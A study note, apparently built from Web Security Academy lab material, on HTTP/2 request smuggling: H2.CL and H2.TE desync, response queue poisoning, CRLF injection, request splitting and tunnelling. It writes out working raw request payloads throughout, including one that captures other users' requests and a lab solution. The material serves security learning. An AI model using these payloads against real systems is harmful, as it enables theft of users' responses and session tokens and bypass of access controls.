# HTTP/2 Request Smuggling

# Advance Request Smuggling / HTTP/2 Request Smuggling

## HTTP/2 Message Length

- request Smuggling is fundamentally about exploiting discrepancies between how different servers interpret the length of request.
- HTTP/2 messages are sent over the wire as a series of separate "frames". Each frame is preceded by an explicit length field, which tells the server exactly how many bytes to read in. Therefore, the length of the request is simply the sum of its frame lengths.
- this is immune to request smuggling if there is no HTTP/2 downgrading there, if server downgrade http/2 to http/1.1 there is chance of introducing request smuggling vulnerabrility.

## HTTP/2 Downgrading

- http/2 downgrading is process of rewriting HTTP/2 request to HTTP/1 syntax to generate an HTTP/1 similar request
- web server/reverse proxy do this to offer http/2 support to the client, while backend server only speak HTTP/1

As HTTP/2 is a binary protocol, we've used some artistic license to represent HTTP/2 messages in a human-readable format throughout these materials:

-   We display each message as a single entity, rather than separate "frames".

-   We display the headers using plain text name and value fields.

-   We prefix pseudo-header names with a colon to help differentiate them from normal headers.

![Http-2-request-smuggling.png](HTTP%202%20Request%20Smuggling%200ffd2fc3215649578b57f29566807fde/Http-2-request-smuggling.png)

![http-2-downgrading.png](HTTP%202%20Request%20Smuggling%200ffd2fc3215649578b57f29566807fde/http-2-downgrading.png)

## H2.CL Vulnerabilities

- http/2 request doesn't have to specify their length explicitly in header.
- during Downgrading Front-end server Add `HTTP/1 Content-Length:` heade, since http/2 have their own builtin mechanism for calculating Content-Length,
- but we can also include `Content-Length` header in HTTP/2 and front-end server simply reuse this value in the resulting HTTP/1 request
- The spec dictates that any `content-length` header in an HTTP/2 request must match the length calculated using the built-in mechanism, but this isn't always validated properly before downgrading.
- we inject our own mis-leading content-length and resulting in `desync`

## NOTE :

- in burp repeater uncheck **update Content-length** and check **Allow HTTP/2 ALPN override**

**Front-End(HTTP/2)**

```
:method

POST

:path

/example

:authority

vulnerable-website.com

content-type

application/x-www-form-urlencoded

content-length

0

GET /admin HTTP/1.1 Host: vulnerable-website.com Content-Length: 10 x=1

```

**Back-End(HTTP/1)**

```
`POST /example HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Content-Length: 10

x=1GET / H`

```

**eg. Payload**

```
POST / HTTP/2
Host: vulnerabile.com
Content-Length: 0

POST /admin
Host: Ourdomain.com
Content-Length: 500

x=requestfromother user will send to our dmoains in this param

```

## H2.TE Vulnerabilities

- Chunked transfer encoding is incpmpatible with HTTP/2 and the spec recommends that any **Transfer-encoding: chunked** headerwe try to inject is `Striped` or ENtire request is blocked.
- if front-end server fails to do this & downgrade the request for HTTP/1 back-end that does support chunked encoding, this lead to smuggling attacks

**Front-end(HTTP/1)**

```
:method

POST

:path

/example

:authority

vulnerable-website.com

content-type

application/x-www-form-urlencoded

transfer-encoding

chunked

0 GET /admin HTTP/1.1 Host: vulnerable-website.com Foo: bar

```

**Back-end(HTTP/1)**

```
POST /example HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Foo: bar

```

we perform same attack with this also,

# Response Queue Poisoning

- Response queue poisoning is high savarity request smuggling attack that cause a front-end server to start mapping response from the back-end to the wrong requests
- Meands every user get response of another users

## Impact of Response Queue poisoning

- impact is Critical, one the response is poisoned, an attacker can capture other user's responses simply by issuing arbitrary follo-up requests.
- This responses may contain sensitive personal or business information/session tokens etc
- this break sites and users get different response from the server while browseing site normallly.

## How to construct Response queue poisoning attack (HTTP Desync Attack)

**Criteria for successfull response queue attack**

- TCP connection b/w front-end & back-end server is reused for multiple request/response cycles
- Attacker is able to successfully smuggle a complete, standalone request that receives its own distinct response from the back-end server
- Attack does not result in either server closing TCP connection. Genarally servers close incomming connection when they receive invalid request, since they can't determine where the request is supposed to end.

## Smuggling Complete request

- when smuggling if we supply incmoplete request, at back-end the leftover byte doesn't form valid request, this lead to close the connection but for attack we need to keep connection open
- so we supply complete request while smuggling

**front-end(CL)**

```
POST / HTTP/1.1\\r\\n
Host: vulnerable-website.com\\r\\n
Content-Type: x-www-form-urlencoded\\r\\n
Content-Length: 61\\r\\n
Transfer-Encoding: chunked\\r\\n
\\r\\n
0\\r\\n
\\r\\n
GET /anything HTTP/1.1\\r\\n
Host: vulnerable-website.com\\r\\n
\\r\\n
GET / HTTP/1.1\\r\\n
Host: vulnerable-website.com\\r\\n
\\r\\n

```

**Back-end(TE)**

```
`POST / HTTP/1.1\\r\\n
Host: vulnerable-website.com\\r\\n
Content-Type: x-www-form-urlencoded\\r\\n
Content-Length: 61\\r\\n
Transfer-Encoding: chunked\\r\\n
\\r\\n
0\\r\\n
\\r\\n

```

```
GET /anything HTTP/1.1\\r\\n
Host: vulnerable-website.com\\r\\n
\\r\\n

```

```
GET / HTTP/1.1\\r\\n
Host: vulnerable-website.com\\r\\n
\\r\\n

```

it sees 3 difrent/complete request

- note no invlid request hitting back-end

## Desynchronizing Response queue

- Front-end correctly maps the response to the initial `wrapper` rewuest and forward this to client, as there are no further request awaiting a response, the second response is held in queue
- when another request hit the back-end, the response in the queue send to the client and resposne from thet client will be taking in queue
- This lead to staling other user's responses.

![http-Desync-attack.png](HTTP%202%20Request%20Smuggling%200ffd2fc3215649578b57f29566807fde/http-Desync-attack.png)

`To make it easier to differentiate stolen responses from responses to your own requests, try using a non-existent path in both of the requests that you send. That way, your own requests should consistently receive a 404 response, for example.`

**EG.Soln**

- Using Burp Repeater, try smuggling an arbitrary prefix in the body of an HTTP/2 request using chunked encoding as follows. Remember to expand the Inspector's **Request Attributes** section and change the protocol to HTTP/2 before sending the request.

```
POST / HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Transfer-Encoding: chunked

0

SMUGGLED

```

- Observe that every second request you send receives a 404 response, confirming that you have caused the back-end to append the subsequent request to the smuggled prefix.
- In Burp Repeater, create the following request, which smuggles a complete request to the back-end server. Note that the path in both requests points to a non-existent endpoint. This means that your request will always get a 404 response. Once you have poisoned the response queue, this will make it easier to recognize any other users' responses that you have successfully captured.

```
 POST /x HTTP/2
 Host: YOUR-LAB-ID.web-security-academy.net
 Transfer-Encoding: chunked

 0

 GET /x HTTP/1.1
 Host: YOUR-LAB-ID.web-security-academy.net

```

```
Note

Remember to terminate the smuggled request properly by including the sequence `\\r\\n\\r\\n` after the `Host` header.

```

## Request Smuggling Via CRLF Injection

- even if website takes steps to prevent basic H2.TE or [h2.CL](http://h2.cl/) attack by stripng CL & TE header there is way to bypass this kind of front-end measures
- In HTTP/1, you can sometimes exploit discrepancies between how servers handle standalone newline (`\\n`) characters to smuggle prohibited headers. If the back-end treats this as a delimiter, but the front-end server does not, some front-end servers will fail to detect the second header at all.
`Foo: bar\\nTransfer-Encoding: chunked`
- This discrepancy doesn't exist with the handling of a full CRLF (`\\r\\n`) sequence because all HTTP/1 servers agree that this terminates the header.
- On the other hand, as HTTP/2 messages are binary rather than text-based, the boundaries of each header are based on explicit, predetermined offsets rather than delimiter characters. This means that `\\r\\n` no longer has any special significance within a header value and, therefore, can be included **inside** the value itself without causing the header to be split:

## NOTE: while adding header foo & bar\r\n Press shift+enter and add transfer-Encoding: chunked

```
foo bar\\r\\nTransfer-Encoding: chunked

```

- This may seem relatively harmless on its own, but when this is rewritten as an HTTP/1 request, the `\\r\\n` will once again be interpreted as a header delimiter. As a result, an HTTP/1 back-end server would see two distinct headers:

```
Foo: bar
Transfer-Encoding: chunked

```

# HTTP/2 EXclusive Vector

- since this is Binary protocol we can have number of potential vectors that are impossible in HTTP/1 due to Syntax
- It's only possible to perform these attacks using the [specialized HTTP/2 features](https://portswigger.net/burp/documentation/desktop/http2/performing-http2-exclusive-attacks) in Burp's Inspector panel.

## Injecting Via Header Names

- in HTTP/1 we can not add `:` , because this character used to indicate the end of name to parser. but in HTTP/2 we can add
**Front-end(HTTP/2)**

```

```

**Back-end(HTTP/1)**

```
Foo: bar\\r\\n
Transfer-Encoding: chunked\\r\\n
X: Ignore\\r\\n

```

## Injecting Via pseudo-headers

- HTTP/2 don't use request lines or statud line, they pass data via series of `pseudo-headers` on the front of the reequest.
- in text base they are prefixed with `:` so differentiate them
- 5 pseudo headers total
    1. `:method` - the request method
    2. `:path` - Request path, including query string
    3. `:authority` - Roughly equivalent to HTTP/1 Host header
    4. `:scheme` -Request Scheme, http or https
    5. `:status` - response status code(Not used in request)
    

## Supplying Ambiguous host

- http/1 Host header replaced by `:authority` pseudo-header in http/2
- Some cases, result in 2 host headers while downgrading, this allows host-header attacks

## Supplying Ambiguous path

- send a request in http/1 is not possible , due to request line parsing, but path in `http/2` is specified using pseudo headers, we can send request with 2 distict paths as follow

```
:method  POST
:path /anything
:path /admin
:authority  vulnerable-website.com

```

## injecting full requet line

- during downgrading, value of `:method` pseudo-header will be written to very begining of the resulting HTTP/1 request.
- if server allows us to include spaces in `:method` value , we may inject entirely different request line
**front-end(HTTP/2)**

```
:method  GET /admin HTTP/1.1
: path /anything
;authority vulnerable-web.com

```

**back-end(http/1.1)**

```
GET /admin HTTP/1.1 /anything HTTP/1.1
Host: vuln-web.com

```

## Injecting a URl prefix

- another feture of HTTP/2 is ability to explicitly specify a scheme in the request using `:scheme` pseudo-header, ordinay just contain http or https but we include arbitrary values
**request**

```
:method GET
:path /anything
:authority vuln-web.com
:scheme <https://evil.net>

```

**Response**

```
:status 301
location  <https://evil.net>://vuln-web.com/anything/

```

## Injecting Newline into pseudo-headers

- when inejcting `:path` or `:method` , make sure that resultign http/1 request still has valid request line
- `\\r\\n` terminate request line in http/1 , adding `\\r\\n` will just break the request after downgrading sequence should be `method space path space HTTP/1.1`**front-end(http/2)**

```
:method GET
:path /example HTTP/1.1\\r\\n
	  Transfer-Encoding: chunked\\r\\n
	  X: x
:authoroty vuln-web.com

```

**back-end(HTTP/1)**

```
GET /example HTTP/1.1\\r\\n
Transfer-Encoding: chunked\\r\\n
X: x HTTP/1.1\\r\\n
Host: vuln-web.com\\r\\n
\\r\\n

```

# HTTP/2 request Splitting

- we have see in Response queue poisoning, how we split 1 request in 2 complete requests on back-end.
- previously we have seen the spliting occured inside message body, but When HTTP/2 downgrading is in play, we can also cause this split to occur in header instead
- this approach is versatile beacuse we aren't depand on reqeust methods that are followed to contain a body

```
:method GET
:path /
:authority vuln-web.com
foo bar \\r\\n
	\\r\\n
	GET /admin HTTP/1.1\\r\\n
	Host: vul-web.com

```

- this also usefull when `Content-length:` is validated and back-end doesnt support chunked encoding

## Accounting for front-end rewriting

- when request is downgraded to http/1 the front-end server add headers manually
- so when putting Host header for 2 nd request ,keep in mind where the front-end server convert :authority to host header and put, if it puts in middle or as it is we need to put smuggled request in last header
- if front-end servert puts host header in end of all header, we need to put smuggled request to upper so that our both request contian `Host` header when downgraded, and both request acceptd, other wise 1 request have 2 host header and 1 have 0
- keep this in mind

```
foo bar\r\n\r\n
GET /x HTTP/1.1\r\n
Host: ac0a1f9d1f71473fc1240e650043002b.web-security-academy.net

```

# HTTP request Tunneling

- Many of the request smuggling attacks we've covered are only possible because the same connection between the front-end and back-end handles multiple requests. Although some servers will reuse the connection for any requests, others have stricter policies.
- some servers only allow requests originating from the same IP address or the same client to reuse the connection. Others won't reuse the connection at all, which limits what you can achieve through classic request smuggling as you have no obvious way to influence other users' traffic.
- Although you can't poison the socket to interfere with other users' requests, you can still send a single request that will elicit two responses from the back-end. This potentially enables you to hide a request and its matching response from the front-end altogether.
- we can use This techinique to bypass front-end security measures, that prevent us for sending certain requests
- some mechanisms designed specifically to prevent request smuggling attacks fail to stop request tunnelling.

## Request Tunneling with HTTP/2

- Request tunnelling is possible with both HTTP/1 and HTTP/2 but is considerably more difficult to detect in HTTP/1-only environments. Due to the way persistent (`keep-alive`) connections work in HTTP/1, even if you do receive two responses, this doesn't necessarily confirm that the request was successfully smuggled.
- In HTTP/2 on the other hand, each "stream" should only ever contain a single request and response. If you receive an HTTP/2 response with what appears to be an HTTP/1 response in the body, you can be confident that you've successfully tunneled a second request.

## Leaking internal Headers via HTTP/2 Request tunneling

- You can potentially trick the front-end into appending the internal headers inside what will become a body parameter on the back-end. Let's say we send a request that looks something like this:

```
:method POST
:path /comment
:authority vulnerable-website.com
content-type application/x-www-form-urlencoded
foo bar\\r\\n
	Content-Length: 200\r\n
	\\r\\n
	comment=

x=1

```

- In this case, both the front-end and back-end agree that there is only one request. What's interesting is that they can be made to disagree on where the headers end.
- The front-end sees everything we've injected as part of a header, so adds any new headers after the trailing `comment=` string. On the other hand, the back-end sees the `\\r\\n\\r\\n` sequence and thinks this is the end of the headers. The `comment=` string, along with the internal headers, are treated as part of the body. The result is a `comment` parameter with the internal headers as its value.

```
POST /comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 200

comment=X-Internal-Header: secretContent-Length: 3
x=1

```

## Blind request tunneling

- Some front-end servers read in all the data they receive from the back-end. This means that if you successfully tunnel a request, they will potentially forward both responses to the client, with the response to the tunnelled request nested inside the body of the main response.
- Other front-end servers only read in the number of bytes specified in the `Content-Length` header of the response, so only the first response is forwarded to the client. This results in a blind request tunnelling vulnerability because you won't be able to see the response to your tunnelled request.

## Non-Blind request tunneling using HEAD

- we can trick the blind request tunneling using HEAD request, as HEAD Request only contain only headers + content-length: so front-end see the content-length header and our 2nd rsponse's headers also combine with 1st response, and we can exploit blind-request tunneling
**request**

```
:method HEAD
:path /example
:authority Vuln-web.com
foo bar\\r\\n
	\\r\\n
	GET /tunnelled HTTP/1.1
	Host: vulnweb.com
	X: x

```

**response**

```
:Status 200
Content-Type: text/html
Content-Length: 134
HTTP/1.1 200 OK
Content-type: text/html
Content-Lenth: 2445

<html>tunnerernsdfkhst l</html>etc

```